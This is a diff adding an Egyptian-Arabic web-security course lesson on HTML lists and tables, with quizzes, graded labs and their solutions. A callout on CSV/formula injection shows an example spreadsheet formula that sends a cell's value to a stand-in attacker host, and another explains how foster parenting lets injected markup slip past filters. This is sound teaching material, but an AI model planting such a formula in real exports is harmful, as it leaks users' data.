@@ -1,0 +1,329 @@
+      <section class="section" id="s05" data-part="الجزء 1 · HTML" data-pk="html" data-nav="القوائم والجداول" data-icon="📋" data-keywords="list ul ol li dl dt dd reversed start value table caption thead tbody tfoot tr th td scope colspan rowspan colgroup col implicit tbody foster parenting csv formula injection">
+        <div class="section-head">
+          <span class="section-index">05</span>
+          <div>
+            <p class="eyebrow">HTML · الدرس 05</p>
+            <h2>القوائم والجداول</h2>
+            <p class="lede">القوائم والجداول هما طريقة HTML لتنظيم البيانات: خطوات، findings، نتائج scan، صلاحيات. وفي الجداول بالذات الـ parser عنده قواعد «غريبة» (يضيف عناصر لوحده، وينقل محتوى لبرا الجدول) — ودي هتفرق معاك لما تكتب selectors أو تحاول تحط payload جوه جدول.</p>
+          </div>
+        </div>
+
+        <h3 class="sub">القوائم: ul وol وdl</h3>
+        <html-example file="lists.html" auto max="560">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Lists</title></head>
+          <body>
+            <h4>Tools (order doesn't matter)</h4>
+            <ul>
+              <li>Burp Suite</li>
+              <li>nmap</li>
+              <li>ffuf
+                <ul><li>wordlist: raft-medium</li></ul>
+              </li>
+            </ul>
+
+            <h4>Methodology (order matters)</h4>
+            <ol>
+              <li>Recon</li>
+              <li>Mapping</li>
+              <li value="10">Exploitation (value=10)</li>
+              <li>Reporting</li>
+            </ol>
+
+            <ol reversed start="3">
+              <li>three</li><li>two</li><li>one</li>
+            </ol>
+
+            <h4>Response headers (term → description)</h4>
+            <dl>
+              <dt>Server</dt><dd>nginx/1.18.0</dd>
+              <dt>X-Powered-By</dt><dd>PHP/7.4.3</dd>
+            </dl>
+          </body>
+          </html>
+        </html-example>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>العنصر</th><th>الاستخدام</th><th>attributes مهمة</th></tr></thead>
+          <tbody>
+            <tr><td><code>ul</code> + <code>li</code></td><td>قايمة الترتيب فيها مش مهم (bullets)</td><td>—</td></tr>
+            <tr><td><code>ol</code> + <code>li</code></td><td>قايمة مرتبة (خطوات، ترتيب أولوية)</td><td><code>start</code>، <code>reversed</code>، <code>type="1|a|A|i|I"</code>؛ و<code>li value</code></td></tr>
+            <tr><td><code>dl</code> + <code>dt</code> + <code>dd</code></td><td>أزواج «مصطلح → وصف»: glossary، metadata، headers</td><td>ممكن أكتر من <code>dd</code> لنفس الـ <code>dt</code></td></tr>
+          </tbody>
+        </table></div>
+        <p>القاعدة: الابن المباشر لـ <code>ul</code>/<code>ol</code> لازم يبقى <code>li</code> (أو <code>script</code>/<code>template</code>). القايمة المتداخلة بتتحط <b>جوه</b> <code>li</code>، مش جنبه. والـ <code>&lt;/li&gt;</code> اختياري في الـ syntax (الـ <code>li</code> الجديد بيقفل اللي قبله) — بس اكتبه دايمًا.</p>
+        <div class="callout tip reveal"><span class="ci">💡</span><div><strong>القوائم في كل حتة</strong><p>أي navigation menu تقريبًا = <code>ul</code> جوه <code>nav</code>، وأي breadcrumb = <code>ol</code>. الشكل (horizontal، بدون bullets) كله CSS. ده بيخلّي قارئ الشاشة يقول «list، 5 items».</p></div></div>
+
+        <h3 class="sub">الجداول: للبيانات الجدولية بس</h3>
+        <p>الجدول = بيانات ليها <b>صفوف وأعمدة</b> بمعنى حقيقي (نتائج scan، findings، مقارنات). زمان كانوا بيعملوا layout الصفحة كلها بالجداول — ده غلط: صعب على قارئات الشاشة، وصعب في الـ responsive. الـ layout بيتعمل بالـ CSS (Flexbox/Grid في الجزء التاني).</p>
+        <html-example file="table.html" auto max="560">
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>Findings</title>
+            <style>
+              table { border-collapse: collapse; font-family: system-ui, sans-serif; }
+              th, td { border: 1px solid #cbd5e1; padding: 6px 10px; text-align: left; }
+              thead th { background: #fff1ea; }
+              caption { font-weight: bold; padding: 6px; }
+            </style>
+          </head>
+          <body>
+            <table>
+              <caption>Findings — shop.example</caption>
+              <thead>
+                <tr><th scope="col">ID</th><th scope="col">Finding</th><th scope="col">Severity</th></tr>
+              </thead>
+              <tbody>
+                <tr><th scope="row">F-01</th><td>Reflected XSS in /search</td><td>High</td></tr>
+                <tr><th scope="row">F-02</th><td>Open redirect in /login</td><td>Medium</td></tr>
+                <tr><th scope="row">F-03</th><td>Version disclosure</td><td>Low</td></tr>
+              </tbody>
+              <tfoot>
+                <tr><td colspan="2">Total</td><td>3</td></tr>
+              </tfoot>
+            </table>
+          </body>
+          </html>
+        </html-example>
+        <div class="table-wrap reveal"><table class="ref">
+          <thead><tr><th>العنصر</th><th>وظيفته</th></tr></thead>
+          <tbody>
+            <tr><td><code>caption</code></td><td>عنوان الجدول (أول ابن للـ table). مهم لقارئ الشاشة.</td></tr>
+            <tr><td><code>thead</code> / <code>tbody</code> / <code>tfoot</code></td><td>رأس / جسم / ذيل الجدول — مجموعات صفوف</td></tr>
+            <tr><td><code>tr</code></td><td>صف (table row)</td></tr>
+            <tr><td><code>th</code></td><td>خلية <b>عنوان</b>؛ مع <code>scope="col"</code> (عنوان عمود) أو <code>scope="row"</code> (عنوان صف)</td></tr>
+            <tr><td><code>td</code></td><td>خلية بيانات</td></tr>
+            <tr><td><code>colspan="n"</code> / <code>rowspan="n"</code></td><td>الخلية تاخد مكان n أعمدة / n صفوف</td></tr>
+            <tr><td><code>colgroup</code> + <code>col</code></td><td>تعريف أعمدة (للـ styling زي العرض واللون)</td></tr>
+          </tbody>
+        </table></div>
+
+        <h3 class="sub">colspan وrowspan</h3>
+        <html-example file="spans.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8">
+            <title>Spans</title>
+            <style>
+              table { border-collapse: collapse; font-family: system-ui, sans-serif; }
+              th, td { border: 1px solid #94a3b8; padding: 6px 12px; }
+              .hi { background: #fee2e2; }
+            </style>
+          </head>
+          <body>
+            <table>
+              <tr><th>Host</th><th>Port</th><th>Service</th></tr>
+              <tr><td rowspan="2">10.0.0.5</td><td>22</td><td>ssh</td></tr>
+              <tr><td>443</td><td>https</td></tr>
+              <tr><td>10.0.0.9</td><td colspan="2" class="hi">filtered (no open ports)</td></tr>
+            </table>
+          </body>
+          </html>
+        </html-example>
+        <p>لاحظ إن الصف التالت فيه <b>خليتين بس</b> في الـ source، لأن خلية الـ IP من الصف اللي فوقه «نازلة» عليه بالـ <code>rowspan</code>. ده بيلخبط أي script بيقرا الجدول بالترتيب (scrapers مثلًا) لو مش واخد باله.</p>
+
+        <h3 class="sub">فخ: الـ tbody اللي ظهر من العدم</h3>
+        <p>لو كتبت <code>&lt;table&gt;&lt;tr&gt;…</code> من غير <code>tbody</code>، الـ parser <b>بيضيف</b> <code>tbody</code> لوحده. يعني في الـ DOM الـ <code>tr</code> ابن لـ <code>tbody</code> مش لـ <code>table</code>. شغّل وبص على الـ console والـ 🌳 DOM:</p>
+        <html-example file="implicit-tbody.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>tbody</title></head>
+          <body>
+            <table id="t">
+              <tr><td>admin</td><td>root</td></tr>
+            </table>
+            <script>
+              console.log("table > tr   :", document.querySelectorAll("#t > tr").length);
+              console.log("table > tbody > tr :", document.querySelectorAll("#t > tbody > tr").length);
+            </script>
+          </body>
+          </html>
+        </html-example>
+
+        <h3 class="sub">Foster parenting: المحتوى اللي بيهرب من الجدول</h3>
+        <p>جوه <code>&lt;table&gt;</code>، المسموح بس صفوف وخلايا وأجزاء الجدول. لو حطيت نص أو عنصر تاني <b>بين</b> الصفوف (مش جوه <code>td</code>)، الـ parser بيـ«تبنّاه» ويحطه <b>قبل</b> الجدول. ده اسمه <b>foster parenting</b>:</p>
+        <html-example file="foster.html" auto>
+          <!DOCTYPE html>
+          <html lang="en">
+          <head><meta charset="UTF-8"><title>Foster</title></head>
+          <body>
+            <table border="1">
+              <tr><td>cell</td></tr>
+              <b>I was written inside the table…</b>
+              <tr><td>cell 2</td></tr>
+            </table>
+          </body>
+          </html>
+        </html-example>
+        <div class="callout pt reveal"><span class="ci">🎯</span><div><strong>ليه ده يهمك؟</strong><p>لو الـ input بتاعك بيتحط في جدول (صف في admin panel مثلًا) ومش جوه خلية، اللي هتحقنه ممكن «يطلع» في مكان تاني من الصفحة. وفلاتر الـ HTML اللي بتحلّل الكود بشكل مختلف عن المتصفح ممكن تفوّت حاجات بسبب القواعد دي — أساس اسمه <b>parser differential</b> (الدرس 13).</p></div></div>
+        <div class="callout mal reveal"><span class="ci">📊</span><div><strong>CSV / Formula injection</strong><p>تطبيقات كتير بتعمل «Export to Excel» للجداول. لو قيمة في خلية بتبدأ بـ <code>=</code> أو <code>+</code> أو <code>-</code> أو <code>@</code>، برنامج الـ spreadsheet ممكن يعتبرها <b>formula</b> لما الـ admin يفتح الملف (زي <code>=HYPERLINK("https://evil.example?d="&amp;A1,"click")</code>). دي ثغرة حقيقية في الـ pentests لأي feature بيعمل export لبيانات المستخدمين.</p></div></div>
+
+        <div class="exercises">
+          <div class="exercises-head"><h3><span class="bulb">✏️</span> تمارين الدرس 05</h3></div>
+          <quiz id="s05-q1" answer="1">
+            <q>عايز قايمة فرعية تحت عنصر «ffuf». تحطها فين؟</q>
+            <o>بعد الـ `</li>` بتاع ffuf مباشرة جوه الـ `ul` الأب</o>
+            <o>جوه الـ `li` بتاع ffuf</o>
+            <o>برا الـ `ul` خالص</o>
+            <o>جوه `dl`</o>
+            <good>القايمة المتداخلة بتبقى ابن للـ `li` اللي تبعه. الابن المباشر لـ `ul`/`ol` لازم يبقى `li`.</good>
+            <bad>`ul` جوه `ul` مباشرة (من غير `li`) markup غلط. الصح: `<li>ffuf <ul>…</ul></li>`.</bad>
+          </quiz>
+          <quiz id="s05-q2" answer="3">
+            <q>`document.querySelectorAll("table > tr")` رجّع 0، مع إن الـ HTML مكتوب فيه `<table><tr>…`. ليه؟</q>
+            <o>الـ selector غلط في الـ syntax</o>
+            <o>الجدول لسه محملش</o>
+            <o>`tr` مش بتتعمل غير جوه `thead`</o>
+            <o>الـ parser ضاف `tbody` تلقائيًا، فالـ `tr` بقى ابن لـ `tbody`</o>
+            <good>ده الـ implicit tbody. استخدم `table tr` (أي descendant) أو `table > tbody > tr`.</good>
+            <bad>الـ DOM ≠ الـ source: الـ parser بيضيف `tbody` لو مش موجود، فالـ `tr` مش ابن مباشر لـ `table`.</bad>
+          </quiz>
+          <quiz id="s05-q3" answer="0">
+            <q>خلية عايزها تاخد عرض عمودين. تكتب إيه؟</q>
+            <o>`<td colspan="2">`</o>
+            <o>`<td rowspan="2">`</o>
+            <o>`<td width="2">`</o>
+            <o>`<td span="2">`</o>
+            <good>`colspan` = عدد الأعمدة، `rowspan` = عدد الصفوف.</good>
+            <bad>الأعمدة = `colspan`. (`span` بتاع `col`/`colgroup` مش الخلية.)</bad>
+          </quiz>
+          <quiz id="s05-q4" answer="2">
+            <q>`<table><tr><td>a</td></tr><p>hello</p></table>` — الـ `p` هيبقى فين في الـ DOM؟</q>
+            <o>جوه الـ `td`</o>
+            <o>جوه الـ `tbody`</o>
+            <o>قبل الـ `table` (foster parenting)</o>
+            <o>هيتشال خالص</o>
+            <good>المحتوى اللي مش مسموح جوه الجدول ومش جوه خلية بيتحط قبل الجدول.</good>
+            <bad>الـ parser مش بيرمي المحتوى، ومش بيحطه في مكان مش مسموح. بينقله قبل الجدول.</bad>
+          </quiz>
+          <quiz id="s05-q5" answer="1">
+            <q>إيه أنسب عنصر لعرض «اسم header ← قيمته» زي `Server ← nginx`؟</q>
+            <o>`ol`</o>
+            <o>`dl` مع `dt` و`dd`</o>
+            <o>`table` من غير `th`</o>
+            <o>`br` بين كل سطر</o>
+            <good>الـ description list مصمم بالظبط لأزواج المصطلح والوصف. (لو البيانات كتير وليها أعمدة، `table` مناسب برضه.)</good>
+            <bad>`dl` (description list) هو المعنى الصح لأزواج term → description.</bad>
+          </quiz>
+          <quiz id="s05-q6" answer="3">
+            <q>ليه `th` مع `scope="col"` أحسن من `td` بخط bold للعناوين؟</q>
+            <o>بيحمّل أسرع</o>
+            <o>مفيش فرق</o>
+            <o>عشان الـ SEO بس</o>
+            <o>قارئ الشاشة بيربط كل خلية بعنوان عمودها، فالجدول بيتفهم من غير ما يتشاف</o>
+            <good>الـ semantics = معنى الآلة تفهمه. `th` + `scope` بيقول «ده عنوان العمود ده».</good>
+            <bad>الشكل ممكن يتعمل بالـ CSS، بس المعنى لأ: `th` + `scope` هو اللي بيعرّف الآلة إن دي خلية عنوان ولأنهي اتجاه.</bad>
+          </quiz>
+
+          <html-lab id="s05-lab1" title="جدول findings احترافي" level="1">
+            <desc><p>اعمل جدول findings فيه:</p>
+            <ul><li><code>caption</code> نصه فيه كلمة <b>Findings</b>.</li>
+            <li><code>thead</code> فيه 3 <code>th</code> عليهم <code>scope="col"</code>: ID و Finding و Severity.</li>
+            <li><code>tbody</code> فيه 3 صفوف، كل صف فيه <b>3 خلايا</b>.</li>
+            <li><code>tfoot</code> فيه صف أوله خلية عليها <code>colspan="2"</code> مكتوب فيها <b>Total</b>.</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Report</title></head>
+              <body>
+                <table>
+
+                </table>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Report</title></head>
+              <body>
+                <table>
+                  <caption>Findings</caption>
+                  <thead>
+                    <tr><th scope="col">ID</th><th scope="col">Finding</th><th scope="col">Severity</th></tr>
+                  </thead>
+                  <tbody>
+                    <tr><td>F-01</td><td>Reflected XSS</td><td>High</td></tr>
+                    <tr><td>F-02</td><td>Open redirect</td><td>Medium</td></tr>
+                    <tr><td>F-03</td><td>Version disclosure</td><td>Low</td></tr>
+                  </tbody>
+                  <tfoot>
+                    <tr><td colspan="2">Total</td><td>3</td></tr>
+                  </tfoot>
+                </table>
+              </body>
+              </html>
+            </solution>
+            <test label="`caption` فيه Findings وهو أول ابن للجدول">has("table > caption") && /findings/i.test(text("caption")) && $("table").firstElementChild === $("caption")</test>
+            <test label="3 `th` بـ `scope=&quot;col&quot;` في الـ `thead` (ID, Finding, Severity)">count("thead th[scope=col]") === 3 && $$("thead th").map(t => t.textContent.trim().toLowerCase()).join(",") === "id,finding,severity"</test>
+            <test label="الـ `tbody` فيه 3 صفوف، كل صف 3 خلايا">count("tbody tr") === 3 && $$("tbody tr").every(tr => tr.cells.length === 3)</test>
+            <test label="`tfoot` فيه خلية `colspan=&quot;2&quot;` مكتوب فيها Total">has("tfoot td[colspan='2'], tfoot th[colspan='2']") && /total/i.test(text("tfoot [colspan='2']"))</test>
+            <hint>الترتيب جوه `table`: `caption` ← `thead` ← `tbody` ← `tfoot`.</hint>
+          </html-lab>
+
+          <html-lab id="s05-lab2" title="Methodology بقوائم متداخلة" level="2">
+            <desc><p>اكتب:</p>
+            <ul><li><code>ol</code> فيه <b>3</b> خطوات بالظبط (عناصر <code>li</code> مباشرة).</li>
+            <li>الخطوة التانية جواها <code>ul</code> فيه <b>عنصرين</b>.</li>
+            <li>الـ <code>ol</code> يبدأ العد من <b>0</b> (Phase 0, 1, 2).</li>
+            <li>وتحت القوائم <code>dl</code> فيه زوجين <code>dt</code>/<code>dd</code> على الأقل.</li></ul></desc>
+            <starter>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Methodology</title></head>
+              <body>
+                <h2>Phases</h2>
+                <ol>
+                  <li>Recon</li>
+                  <li>Testing</li>
+                  <ul><li>Auth</li><li>Input validation</li></ul>
+                  <li>Reporting</li>
+                </ol>
+              </body>
+              </html>
+            </starter>
+            <solution>
+              <!DOCTYPE html>
+              <html lang="en">
+              <head><meta charset="UTF-8"><title>Methodology</title></head>
+              <body>
+                <h2>Phases</h2>
+                <ol start="0">
+                  <li>Recon</li>
+                  <li>Testing
+                    <ul><li>Auth</li><li>Input validation</li></ul>
+                  </li>
+                  <li>Reporting</li>
+                </ol>
+                <dl>
+                  <dt>Scope</dt><dd>*.shop.example</dd>
+                  <dt>Window</dt><dd>Nov 20 – Dec 31</dd>
+                </dl>
+              </body>
+              </html>
+            </solution>
+            <test label="الـ `ol` فيه 3 `li` مباشرة">count("ol > li") === 3</test>
+            <test label="الـ `ul` (عنصرين) جوه الخطوة التانية">$$("ol > li")[1] && $$("ol > li")[1].querySelectorAll(":scope > ul > li").length === 2</test>
+            <test label="مفيش `ul` ابن مباشر للـ `ol`">!has("ol > ul")</test>
+            <test label="العد بيبدأ من 0 (`start=&quot;0&quot;`)">attr("ol", "start") === "0"</test>
+            <test label="`dl` فيه زوجين `dt`/`dd` على الأقل">count("dl > dt") >= 2 && count("dl > dd") >= 2</test>
+            <hint>انقل الـ `<ul>` لجوه الـ `<li>Testing … </li>`، وضيف `start="0"` على الـ `ol`.</hint>
+          </html-lab>
+
+          <task id="s05-t1" title="اقرا الجدول صح" level="1" answer="high" reject="low">
+            <desc><p>من الجدول ده (من تقرير scanner)، إيه الـ <b>Severity</b> بتاعة <b>F-02</b>؟</p></desc>
+            <listing lang="html" file="scan.html">
+              <table>
+                <tr><th>ID</th><th>Finding</th><th>Severity</th></tr>
+                <tr><td>F-01</td><td>Reflected XSS</td><td rowspan="2">High</td></tr>
+                <tr><td>F-02</td><td>Stored XSS</td></tr>
+                <tr><td>F-03</td><td>Missing HttpOnly</td><td>Low</td></tr>
+              </table>
+            </listing>
+            <explain>`High` — خلية الـ Severity في صف F-01 عليها `rowspan="2"` فبتغطي صف F-02 كمان. لو قريت الجدول بالـ source سطر سطر (زي scraper ساذج) هتفتكر إن F-02 مالوش severity.</explain>
+          </task>
+        </div>
+      </section>
